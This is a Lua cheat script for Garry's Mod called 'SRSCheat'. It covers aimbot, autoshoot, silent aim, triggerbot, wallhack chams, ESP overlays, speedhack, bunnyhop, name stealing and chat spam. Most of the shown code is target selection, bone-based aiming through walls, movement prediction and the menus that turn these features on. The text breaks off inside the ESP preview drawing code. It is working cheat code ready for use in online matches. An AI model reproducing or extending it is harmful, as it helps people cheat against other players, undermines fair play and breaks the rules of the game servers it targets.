local SetStencilCompareFunction = render.SetStencilCompareFunction
local SetStencilReferenceValue = render.SetStencilReferenceValue
local SetStencilZFailOperation = render.SetStencilZFailOperation
local SetStencilFailOperation = render.SetStencilFailOperation
local SetStencilPassOperation = render.SetStencilPassOperation
local SuppressEngineLighting = render.SuppressEngineLighting
local SetColorModulation = render.SetColorModulation
local MaterialOverride = render.MaterialOverride
local SetStencilEnable = render.SetStencilEnable
local ClearStencil = render.ClearStencil
local SetViewPort = render.SetViewPort
local SetMaterial = render.SetMaterial
local RenderView = render.RenderView
local DrawBeam = render.DrawBeam
local SetBlend = render.SetBlend
local pi = math.pi
local abs = math.abs
local min = math.min
local max = math.max
local fmod = math.fmod
local floor = math.floor
local Clamp = math.Clamp
local round = math.Round
local random = math.random
local Approach = math.Approach
local NormalizeAngle = math.NormalizeAngle
local HasValue = table.HasValue
local insert = table.insert
local remove = table.remove
local Random = table.Random
local Empty = table.Empty
local IgnoreZ = cam.IgnoreZ
local Start3D = cam.Start3D
local End3D = cam.End3D
local IsKeyDown = input.IsKeyDown
local IsMouseDown = input.IsMouseDown
local DrawOutlinedRect = surface.DrawOutlinedRect
local SetTextColor = surface.SetTextColor
local SetDrawColor = surface.SetDrawColor
local GetTextSize = surface.GetTextSize
local RoundedBoxEx = draw.RoundedBoxEx
local SetTextPos = surface.SetTextPos
local DrawCircle = surface.DrawCircle
local RoundedBox = draw.RoundedBox
local DrawText = surface.DrawText
local DrawRect = surface.DrawRect
local DrawLine = surface.DrawLine
local SetFont = surface.SetFont
local bor = bit.bor
local band = bit.band
local bnot = bit.bnot
local format = string.format
local strstr = string.find
local gsub = string.gsub
local MousePos = gui.MousePos
local vgui_Create = vgui.Create
local chat_AddText = chat.AddText
local GetAllPlayers = player.GetAll
local GetAllEnts = ents.GetAll
local TraceLine = util.TraceLine
local JSONToTable = util.JSONToTable
local TableToJSON = util.TableToJSON
local HealthToString = util.HealthToString
local GetPlayerTrace = util.GetPlayerTrace
local Exists = file.Exists
local MkDir = file.CreateDir
local Write = file.Write
local IsDir = file.IsDir
local Read = file.Read
local Dir = file.Find
local color_white, color_black, color_blue, color_yellow, color_green, color_blue, color_dark, color_orange =
        Color( 255, 255, 255 ), Color( 0, 0, 0 ), Color( 255, 0, 0 ), Color( 173, 216, 230 ), Color( 0, 255, 0 ), Color( 0, 0, 255 ), Color( 0, 0, 0, 128 ), Color( 255, 120, 0, 255 )
local SRSscript =
{
        ESP = false,
        NICK = false,
        INFO = false,
        LASER = false,
        TRACE = false,
        RADAR = false,
        WEPESP = false,
        ESPDST = false,
        BARREL = false,
        ESPBAR = false,
        DRAWBOX = false,
        TRIGGER = false,
        POSPRED = false,
        CROWBAR = false,
        FAKEVIEW = false,
        IGNORE_T = false,
        WALLHACK = false,
        BONESCAN = false,
        AUTOSHOT = false,
        BUNNYHOP = false,
        SVCHEATS = false,
        SPECLIST = false,
        AUTOWALL = false,
        RADAR_NICK = false,
        AIMENABLED = false,
        AUTOPISTOL = false,
        DETECTSPEC = false,
        AUTORELOAD = false,
        THIRDPERSON = false,
        NAMESTEALER = false,
        IGNORE_TEAM = false,
        IGNORE_STEAM = false,
        DETECTRAITOR = false,
        ANTIAIMPROXY = false,
        FLASHSPAM = false,
        CHATSPAM1 = false,
        CHATSPAM2 = false,
        CHATSPAM3 = false,
        CHATSPAM4 = false,
        CHATSPAM5 = false,
        ESPINCLUDENPCS = false,
        RADINCLUDENPCS = false,
        ESPINCLUDEPLAYERS = false,
        RADINCLUDEPLAYERS = false,
        BUTTON = 0,
        AIMMODE = 0,
        ANTIAIM = 0,
        BOXMODE = 1,
        AIMRANGE = 0,
        CROSSMODE = 0,
        SPEEDHACK = 1,
        RADAR_SIZE = 128,
        RADAR_SCALE = 2048,
        FSTR = 'default',
        LOOKUPBONE = 'Head',
        MENU_POS = { ScrW() / 2 - 240, ScrH() / 2 - 180 },
        SPEC_POS = { ScrW() * 0.1, ScrH() / 2 },
        DRONE_POS = { 10, 10 },
        RADAR_POS = { ScrW() * 0.1, ScrH() / 2 },
        LASERCOLOR = { r = 255, g = 255, b = 255, a = 255 },
        CROSSCOLOR = { r = 255, g = 255, b = 255, a = 255 }
}
 
 
local SRSscript_menu
local SRSscript_lpdc
local SRSscript_campos
local SRSscript_camang
local SRSscript_target
local SRSscript_lastpos
local SRSscript_nickorig
local SRSscript_gx, SRSscript_gy
local SRSscript_dx, SRSscript_dy
local SRSscript_sx, SRSscript_sy
local SRSscript_down_l, SRSscript_down_r
local SRSscript_aimbot = false
local SRSscript_keydown = false
local SRSscript_spec_grab = false
local SRSscript_radar_grab = false
local SRSscript_drone_grab = false
 
local SRSscript_self = LocalPlayer()
local SRSscript_oldpunch = Angle()
local SRSscript_buttons = { MOUSE_LEFT, MOUSE_MIDDLE, MOUSE_RIGHT }
local SRSscript_bones =
{
        Head = 'ValveBiped.Bip01_Head1',
        Neck = 'ValveBiped.Bip01_Neck1',
        Spine = 'ValveBiped.Bip01_Spine',
        Spine1 = 'ValveBiped.Bip01_Spine1',
        Spine2 = 'ValveBiped.Bip01_Spine2',
        Spine3 = 'ValveBiped.Bip01_Spine3',
        Spine4 = 'ValveBiped.Bip01_Spine4',
        [ 'R Hand' ] = 'ValveBiped.Bip01_R_Hand',
        [ 'L Hand' ] = 'ValveBiped.Bip01_L_Hand',
        [ 'R Calf' ] = 'ValveBiped.Bip01_R_Calf',
        [ 'R Foot' ] = 'ValveBiped.Bip01_R_Foot',
        [ 'R Toes' ] = 'ValveBiped.Bip01_R_Toe0',
        [ 'L Calf' ] = 'ValveBiped.Bip01_L_Calf',
        [ 'L Foot' ] = 'ValveBiped.Bip01_L_Foot',
        [ 'L Toes' ] = 'ValveBiped.Bip01_L_Toe0',
        [ 'L Thigh' ] = 'ValveBiped.Bip01_L_Thigh',
        [ 'R Thigh' ] = 'ValveBiped.Bip01_R_Thigh',
        [ 'L Forearm' ] = 'ValveBiped.Bip01_L_Forearm',
        [ 'R Forearm' ] = 'ValveBiped.Bip01_R_Forearm',
        [ 'L Upperarm' ] = 'ValveBiped.Bip01_L_UpperArm',
        [ 'R Upperarm' ] = 'ValveBiped.Bip01_R_UpperArm'
}
 
local SRSscript_spectators = {}
local SRSscript_rayt_buff = {}
local SRSscript_namebuff = {}
local SRSscript_targets = {}
local SRSscript_keypads = {}
local SRSscript_hooks = {}
local SRSscript_next = 0
local SRSscript_item = 1
local SRSscript_p = SRSscript_self:EyeAngles().p
local SRSscript_y = SRSscript_self:EyeAngles().y
 
local function SRSscript_REGISTERHOOK( str, func )
        hook.Add( str, '', func )
end
 
local function SRSscript_BUILDTRACE()
        local tr = GetPlayerTrace( SRSscript_self )
        tr.mask = SRSscript.AUTOWALL and 1174421507 or nil
       
        if SRSscript.ANTIAIM ~= 0 then
                local vec = Vector( 16384, 0, 0 )
                        vec:Rotate( Angle( SRSscript_p, SRSscript_y, 0 ) )
               
                local src = SRSscript_self:GetShootPos()
                tr.endpos = src + vec
        end
       
        local tr = TraceLine( tr )
        return tr
end
local plr = GetAllPlayers()
local function SRSscript_TARGETS( rad, esp, func )
        Empty( SRSscript_targets )
        local plr = GetAllPlayers()
       
        if rad or esp then
                local ent = GetAllEnts()
                for i = 1, #ent do
                        local pl = ent[ i ]
                        if pl ~= SRSscript_self and ( ( rad and SRSscript.RADINCLUDENPCS or esp and SRSscript.ESPINCLUDENPCS ) and pl:IsNPC() and pl:GetMoveType() ~= 0 and pl:GetClass() ~= 'npc_turret_floor' and pl:GetClass() ~= 'npc_grenade_frag' or ( rad and SRSscript.RADINCLUDEPLAYERS or esp and SRSscript.ESPINCLUDEPLAYERS ) and pl:IsPlayer() and pl:GetMoveType() ~= MOVETYPE_OBSERVER and pl:Health() > 0 ) then
                                insert( SRSscript_targets, pl )
                        end
                end
        else
                local ent = GetAllEnts()
                for i = 1, #ent do
                        local pl = ent[ i ]
                        if pl ~= SRSscript_self and ( ( SRSscript.AIMMODE == 0 or SRSscript.AIMMODE == 2 ) and pl:IsNPC() and pl:GetMoveType() ~= 0 and pl:GetClass() ~= 'npc_turret_floor' and pl:GetClass() ~= 'npc_grenade_frag' or ( SRSscript.AIMMODE == 0 or SRSscript.AIMMODE == 1 ) and pl:IsPlayer() and pl:GetMoveType() ~= MOVETYPE_OBSERVER and pl:Health() > 0 ) then
                                insert( SRSscript_targets, pl )
                        end
                end
        end
end
 
local function SRSscript_GETDIST( vec )
        local a = ( vec - SRSscript_self:GetShootPos() ):Angle() - Angle( SRSscript_p, SRSscript_y, 0 )
        return abs( abs( a.p - 180 ) + abs( a.y - 180 ) - 360 )
end
 
local function SRSscript_CANTARGET( ply, comp )
        if not ply:IsNPC() and not ply:IsPlayer() then return false end
        if ply:IsPlayer() and SRSscript.AIMMODE == 2 then return false end
        if ply:IsNPC() and SRSscript.AIMMODE == 1 then return false end
        if SRSscript.IGNORE_T and SRSscript_self.GetRole  and ply.GetRole and SRSscript_self:GetRole() ~= ROLE_INNOCENT and SRSscript_self:GetRole() == ply:GetRole() then return false end
        if comp and SRSscript.AIMRANGE ~= 0 and SRSscript_GETDIST( ply:GetPos() + ply:OBBCenter() ) > SRSscript.AIMRANGE then return false end
        if comp and ply:IsPlayer() and ply:InVehicle() then return false end
       
        if ply:IsPlayer() and SRSscript.AIMMODE == 0 or SRSscript.AIMMODE == 1 then
                if SRSscript.IGNORE_TEAM and ply:Team() == SRSscript_self:Team() then return false end
                if SRSscript.IGNORE_STEAM then
                        if not ply.GetFriendSt then ply.GetFriendSt = ply:GetFriendStatus() == 'friend' end
                        if ply.GetFriendSt then return false end
                else
                        if ply.GetFriendSt then
                                ply.GetFriendSt = nil
                        end
                end
        end
       
        return true
end
 
local function SRSscript_GETPLAYERCOLOR( ply )
        if SRSscript_CANTARGET( ply ) then return color_blue else return color_green end
end
 
local function SRSscript_PREDICTPOS( pl, pos )
        local rft = RealFrameTime()
        return pos + SRSscript_self:GetVelocity() * rft / 45 - pl:GetVelocity() * rft / 65
end
 
local function SRSscript_GETBONEPOS( pl )
        local pos = SRSscript_self:GetShootPos()
       
        SRSscript_rayt_buff.filter = SRSscript_self
        SRSscript_rayt_buff.mask = SRSscript.AUTOWALL and 1174421507 or nil
       
        if pl:GetBoneCount() < 2 then
                local over = pl:GetPos() + Vector( 0, 0, pl:OBBMaxs()[3] - ( pl:Crouching() and 45 or 25 ) )
               
                SRSscript_rayt_buff.start = pos
                SRSscript_rayt_buff.endpos = over
               
                local tr = TraceLine( SRSscript_rayt_buff )
               
                if tr.Entity == pl then
                        return over
                end
        end
 
        local mpos
        local bone = SRSscript.LOOKUPBONE
        local aaproxy = SRSscript.ANTIAIMPROXY and ( pl:EyeAngles().p < -89 or pl:EyeAngles().p > 89 )
        if aaproxy and ( bone == 'Head' or bone == 'Neck' ) then
                mpos = pl:GetPos() + pl:OBBCenter()
        end
       
        local SRSscript_BONE
        if not aaproxy then
                SRSscript_BONE = pl:LookupBone( SRSscript_bones[ bone ] )
        end
       
        if SRSscript_BONE then
                local endp = aaproxy and mpos or pl:GetBonePosition( SRSscript_BONE )
               
                SRSscript_rayt_buff.start = pos
                SRSscript_rayt_buff.endpos = endp
               
                local tr = TraceLine( SRSscript_rayt_buff )
               
                if tr.Entity == pl then
                        return endp
                end
        end
       
        if SRSscript.BONESCAN then
                for bone = 0, pl:GetBoneCount() - 1 do
                        local endp = pl:GetBonePosition( bone )
                       
                        SRSscript_rayt_buff.start = pos
                        SRSscript_rayt_buff.endpos = endp
                       
                        local tr = TraceLine( SRSscript_rayt_buff )
                       
                        if tr.Entity == pl then
                                return endp
                        end
                end
        end
end
 
local title =
{
        'SRSCheat loaded!',
        'SRSCheat loaded!',
        'SRSCheat loaded!',
        'SRSCheat loaded!',
        'SRSCheat loaded!'
}
 
local function SRSscript_OPENMENU() end
local function SRSscript_CLOSEMENU()
        if SRSscript_menu and not SRSscript_menu.Block and ( SRSscript_menu.Hold or 0 ) < 15 then
                SRSscript_menu.Block = true
                SRSscript_menu:ShowCloseButton( true )
        end
       
        if not SRS_menu or SRSscript_menu.Block then return end
       
        SRSscript_menu:Close()
        SRSscript_menu = nil
end
 
local function SRSscript__ABOT( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
       
        local y = 11
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Enable Aimbot' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.AIMENABLED )
                end
               
                ch.OnChange = function( self )
                        SRSscript.AIMENABLED = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Autoshoot' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.AUTOSHOT )
                end
               
                ch.OnChange = function( self )
                        SRSscript.AUTOSHOT = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Silentaim (Fakeview)' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.FAKEVIEW )
                end
               
                ch.OnChange = function( self )
                        SRSscript.FAKEVIEW = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Bonescanning' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.BONESCAN )
                end
               
                ch.OnChange = function( self )
                        SRSscript.BONESCAN = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Melee Bot' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.CROWBAR )
                end
               
                ch.OnChange = function( self )
                        SRSscript.CROWBAR = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Ignore Team Mates' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.IGNORE_TEAM )
                end
               
                ch.OnChange = function( self )
                        SRSscript.IGNORE_TEAM = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Ignore Steam Friends' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.IGNORE_STEAM )
                end
               
                ch.OnChange = function( self )
                        SRSscript.IGNORE_STEAM = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Prediction' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.POSPRED )
                end
               
                ch.OnChange = function( self )
                        SRSscript.POSPRED = self:GetChecked()
                end
               
                y = y + 17.5
                local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Triggerbot' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.TRIGGER )
                end
               
                ch.OnChange = function( self )
                        SRSscript.TRIGGER = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Automatic Pistol' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.AUTOPISTOL )
                end
               
                ch.OnChange = function( self )
                        SRSscript.AUTOPISTOL = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Automatic Reloading' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.AUTORELOAD )
                end
               
                ch.OnChange = function( self )
                        SRSscript.AUTORELOAD = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( '[TTT] Ignore role mates' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.IGNORE_T )
                end
               
                ch.OnChange = function( self )
                        SRSscript.IGNORE_T = self:GetChecked()
                end
        local clk = Color( 255, 0, 0, 180 )
        local maus = vgui_Create( 'DPanel', panel )
                maus:SetPos( 300, 18 )
                maus:SetSize( 48, 64 )
                maus.Paint = function()
                        local x, y = MousePos()
                        local rx, ry = SRSscript_menu:GetPos()
                                x, y = x - rx - 425, y - ry - 41
                       
                        RoundedBox( 10, 0, 0, 48, 64, color_white )
                       
                        if x > 0 and x < 48 and y > 24 and y < 64 or SRSscript.BUTTON == 0 then
                                RoundedBoxEx( 10, 0, 24, 48, 40, clk, false, false, true, true )
                               
                                if IsMouseDown( MOUSE_LEFT ) and SRSscript.BUTTON ~= 0 then
                                        SRSscript.BUTTON = 0
                                end
                        end
                       
                        if x > 0 and x < 22 and y > 0 and y < 24 or SRSscript.BUTTON == 1 then
                                RoundedBoxEx( 10, 0, 0, 24, 24, clk, true, false, false, false )
                               
                                if IsMouseDown( MOUSE_LEFT ) and SRSscript.BUTTON ~= 1 then
                                        SRSscript.BUTTON = 1
                                end
                        end
                       
                        if x > 27 and x < 48 and y > 0 and y < 24 or SRSscript.BUTTON == 3 then
                                RoundedBoxEx( 10, 24, 0, 24, 24, clk, false, true, false, false )
                               
                                if IsMouseDown( MOUSE_LEFT ) and SRSscript.BUTTON ~= 3 then
                                        SRSscript.BUTTON = 3
                                end
                        end
                       
                        if x > 22 and x < 27 and y > 0 and y < 24 and IsMouseDown( MOUSE_LEFT ) then
                                SRSscript.BUTTON = 2
                        end
                       
                        SetDrawColor( color_black )
                        DrawLine( 0, 24, 48, 24 )
                        DrawLine( 24, 0, 24, 24 )
                       
                        SetDrawColor( ( SRSscript.BUTTON == 2 or x > 22 and x < 27 and y > 0 and y < 24 ) and clk or color_black )
                        DrawRect( 22, 2, 5, 20 )
                end
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 220, 88 )
                label:SetText( 'Aim at:' )
                label:SizeToContents()
       
        local bone = vgui_Create( 'DComboBox', panel )
                bone:SetPos( 220, 106 )
                bone:SetWide( 128 )
                for k in pairs( SRSscript_bones ) do
                        bone:AddChoice( k )
                end
               
                bone.Color = color_black
                bone.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                bone.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                bone:ChooseOption( SRSscript.LOOKUPBONE )
               
                bone.OnSelect = function( self )
                        SRSscript.LOOKUPBONE = self:GetValue()
                end
               
                bone.Paint = function( self )
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                bone.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( self:GetValue() )
                end
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 220, 138 )
                label:SetText( 'Aim mode:' )
                label:SizeToContents()
       
        local aimm = vgui_Create( 'DComboBox', panel )
                aimm:SetPos( 220, 156 )
                aimm:SetWide( 128 )
                aimm:AddChoice( 'Players and NPCs' )
                aimm:AddChoice( 'Players only' )
                aimm:AddChoice( 'NPCs only' )
                aimm.Color = color_black
                aimm.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                aimm.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                aimm:ChooseOptionID( SRSscript.AIMMODE + 1 )
               
                aimm.OnSelect = function( self, index )
                        SRSscript.AIMMODE = index - 1
                end
               
                aimm.Paint = function( self )                  
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                aimm.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( self:GetValue() )
                end
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 220, 188 )
                label.Think = function()
                        label:SetText( 'Aimbot range ' .. ( SRSscript.AIMRANGE == 0 and 'unlimited' or 'limit: ' .. SRSscript.AIMRANGE .. 'd' ) )
                        label:SizeToContents()
                end
               
        local rad = vgui_Create( 'DSlider', panel )
                rad:SetPos( 220, 200 )
                rad:SetWide( 128 )
                rad:SetSlideX( SRSscript.AIMRANGE / 180 )
                rad.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                rad.Think = function()
                        SRSscript.AIMRANGE = round( rad:GetSlideX() * 180 )
                end
end
 
local function SRSscript__VIS( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
               
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 260, 2 )
                label:SetText( 'Beam color' )
                label:SizeToContents()
               
        local rgb = vgui_Create( 'DLabel', panel )
                rgb:SetPos( 221, 20 )
                rgb:SetText( 'R: 255\nG: 255\nB: 255' )
                rgb:SizeToContents()
                rgb.Think = function()
                        rgb:SetText( format( 'R: %i\nG: %i\nB: %i', SRSscript.LASERCOLOR.r, SRSscript.LASERCOLOR.g, SRSscript.LASERCOLOR.b ) )
                end
               
        local ind = vgui_Create( 'DPanel', panel )
                ind:SetPos( 310, 20 )
                ind:SetSize( 40, 40 )
                ind.Paint = function()
                        SetDrawColor( SRSscript.LASERCOLOR )
                        DrawRect( 0, 0, ind:GetSize() )
                       
                        SetDrawColor( color_black )
                        DrawOutlinedRect( 0, 0, ind:GetSize() )
                end
               
        local r = vgui_Create( 'DSlider', panel )
                r:SetPos( 220, 60 )
                r:SetWide( 128 )
                r:SetSlideX( SRSscript.LASERCOLOR.r / 255 )
                r.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                r.Think = function()
                        SRSscript.LASERCOLOR.r = r:GetSlideX() * 255
                end
               
        local g = vgui_Create( 'DSlider', panel )
                g:SetPos( 220, 80 )
                g:SetWide( 128 )
                g:SetSlideX( SRSscript.LASERCOLOR.g / 255 )
                g.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                g.Think = function()
                        SRSscript.LASERCOLOR.g = g:GetSlideX() * 255
                end
               
        local b = vgui_Create( 'DSlider', panel )
                b:SetPos( 220, 100 )
                b:SetWide( 128 )
                b:SetSlideX( SRSscript.LASERCOLOR.b / 255 )
                b.Paint = function()
                        SetDrawColor( color_black )
                        DrawRect( 0, 9, 128, 3 )
                end
               
                b.Think = function()
                        SRSscript.LASERCOLOR.b = b:GetSlideX() * 255
                end
end
 
local function SRSscript__ESP( panel )
        panel.Paint = nil
        panel:SetSize( 360, 335 )
       
        local y = 11
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Wallhack Chams (Laggy)' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.WALLHACK )
                end
               
                ch.OnChange = function( self )
                        SRSscript.WALLHACK = self:GetChecked()
                       
                       
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Include players' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.ESPINCLUDEPLAYERS )
                end
               
                ch.OnChange = function( self )
                        SRSscript.ESPINCLUDEPLAYERS = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Include NPCs' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.ESPINCLUDENPCS )
                end
               
                ch.OnChange = function( self )
                        SRSscript.ESPINCLUDENPCS = self:GetChecked()
                end
       
        y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Nick ESP' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.NICK )
                end
               
                ch.OnChange = function( self )
                        SRSscript.NICK = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Health and armor ESP' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.INFO )
                end
               
                ch.OnChange = function( self )
                        SRSscript.INFO = self:GetChecked()
                       
                        if not SRSscript.INFO then
                                SRSscript.WEPESP = false
                        end
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Weapon ESP' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.WEPESP )
                end
               
                ch.OnChange = function( self )
                        SRSscript.WEPESP = self:GetChecked()
                       
                        if SRSscript.WEPESP then
                                SRSscript.INFO = true
                        end
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Barrel ESP' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.BARREL )
                end
               
                ch.OnChange = function( self )
                        SRSscript.BARREL = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Distance ESP' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.ESPDST )
                end
               
                ch.OnChange = function( self )
                        SRSscript.ESPDST = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Health and armor bars' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.ESPBAR )
                end
               
                ch.OnChange = function( self )
                        SRSscript.ESPBAR = self:GetChecked()
                end
               
                y = y + 17.5
        local ch = vgui_Create( 'DCheckBoxLabel', panel )
                ch:SetPos( 5, y )
                ch:SetText( 'Lines' )
                ch:SizeToContents()
                ch.Think = function()
                        ch:SetValue( SRSscript.TRACE )
                end
               
                ch.OnChange = function( self )
                        SRSscript.TRACE = self:GetChecked()
                end
       
        local label = vgui_Create( 'DLabel', panel )
                label:SetPos( 260, 2 )
                label:SetText( 'ESP boxes' )
                label:SizeToContents()
       
        local espbox = vgui_Create( 'DComboBox', panel )
                espbox:SetPos( 220, 18 )
                espbox:SetWide( 128 )
                espbox:AddChoice( 'Off' )
                espbox:AddChoice( '2D boxes' )
                espbox:AddChoice( '3D boxes' )
                espbox.Color = color_black
                espbox.OnCursorEntered = function( self )
                        self.Color = color_green
                end
               
                espbox.OnCursorExited = function( self )
                        self.Color = color_black
                end
               
                if SRSscript.ESP then
                        espbox:ChooseOptionID( 2 )
                elseif SRSscript.DRAWBOX then
                        espbox:ChooseOptionID( 3 )
                else
                        espbox:ChooseOptionID( 1 )
                end
               
                espbox.OnSelect = function( self, index )
                        if index == 1 then
                                SRSscript.ESP = false
                                SRSscript.DRAWBOX = false
                               
                                return
                        end
                       
                        if index == 2 then
                                SRSscript.ESP = true
                                SRSscript.DRAWBOX = false
                        else
                                SRSscript.ESP = false
                                SRSscript.DRAWBOX = true
                        end
                end
               
                espbox.Paint = function( self )
                        SetDrawColor( self.Color )
                        DrawOutlinedRect( 0, 0, self:GetSize() )
                end
               
                espbox.PaintOver = function( self )
                        SetFont( 'DermaDefault' )
                        SetTextColor( color_white )
                        SetTextPos( 8, 4 )
                        DrawText( espbox:GetValue() )
                end
               
        local espdem = vgui_Create( 'DPanel', panel )
                espdem:SetPos( 156, 48 )
                espdem:SetSize( 192, 256 )
                espdem.Paint = function()
                        SetDrawColor( color_blue )
                        DrawOutlinedRect( 56, 0, 80, 200 )
                       
                        if SRSscript.BOXMODE == 1 then
                                SetDrawColor( color_black )
                                DrawRect( 56, 202, 80, 4 )
                               
                                SetDrawColor( color_blue )
                                DrawRect( 57, 203, 71.76, 2 )
                               
                                SetDrawColor( color_black )
                                DrawRect( 56, 205, 80, 4 )
                               
                                SetDrawColor( color_blue )
                                DrawRect( 57, 206, 26.52, 2 )
                               
                                SetFont( 'DermaDefault' )
                                SetTextColor( color_green )
                                SetTextPos( 96 - GetTextSize( 'John' ) / 2, 208 )
                                DrawText( 'Hacker' )
                               
                                local str = { 'H: 100' }
                                str[ 2 ] = 'W: weapon_ak47'
                               
                                SetTextColor( color_yellow )
                               
                                local y = 1
                                local w = max( GetTextSize( str[ 1 ] ), GetTextSize( str[ 2 ] or '' ) )
                                for i = 1, 2 do
                                        local t = str[ i ]
                                       
                                        if t then
                                                SetTextPos( 96 - w / 2, 208 + y * 12 )
                                                DrawText( str[ i ] )
                                               
                                                if i == 1 then
                                                        SetTextPos( 96 + w / 2 - GetTextSize( 'A: 34' ), 208 + y * 12 )
                                                        DrawText( 'A: 14' )
                                                end
                                               
                                                y = y + 1
                                        end
                                end
                        elseif SRSscript.BOXMODE == 0 then
                                SetDrawColor( color_black )
                                DrawRect( 50, 0, 4, 200 )
                               
                                SetDrawColor( color_blue )
                                DrawRect( 51, 17.84, 2, 182.16 )
                               
                                SetDrawColor( color_black )
                                DrawRect( 46, 0, 4, 200 )
                               
                                SetDrawColor( color_blue )
                                DrawRect( 47, 132.64, 2, 67.32 )
                               
                                SetFont( 'DermaDefault' )
                                SetTextColor( color_green )
                                SetTextPos( 42 - GetTextSize( 'John' ), 0 )
                                DrawText( 'John' )
                               
                                SetTextColor( color_yellow )
                                SetTextPos( 42 - GetTextSize( 'H: 92' ), 12 )
                                DrawText( 'H: 92' )
                               
                                SetTextPos( 42 - GetTextSize( 'A: 34' ), 24 )
                                DrawText( 'A: 34' )
                               
